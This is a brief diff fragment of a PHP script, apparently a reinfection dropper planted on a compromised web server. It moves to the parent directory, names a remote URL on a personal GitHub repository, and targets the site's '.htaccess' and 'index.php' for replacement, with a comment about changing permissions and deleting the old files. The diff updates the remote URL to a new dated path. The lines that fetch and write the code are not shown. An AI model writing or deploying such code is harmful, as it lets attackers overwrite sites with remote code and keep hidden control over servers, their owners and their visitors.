@@ -2,7 +2,7 @@
 
 chdir('..');
 
-$remoteUrl = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/index.php';
+$remoteUrl = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/3-9-26/index.php';
 $files = ['.htaccess', 'index.php'];
 
 /* chmod and delete old files */
